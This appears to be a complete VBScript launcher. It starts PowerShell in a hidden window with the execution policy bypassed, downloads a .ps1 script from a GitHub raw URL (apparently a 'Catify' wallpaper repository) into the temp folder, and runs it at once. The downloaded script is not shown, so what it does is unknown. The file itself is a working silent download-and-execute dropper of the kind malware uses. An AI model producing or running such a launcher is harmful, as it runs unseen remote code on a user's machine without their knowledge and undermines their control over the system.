Set shell = CreateObject("Wscript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
         """Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Nyxify/Catify/main/wallpaper/windows.ps1' " & _
         "-OutFile '$env:TEMP\windows.ps1'; " & _
         ". '$env:TEMP\windows.ps1'"""

shell.Run command, 0, False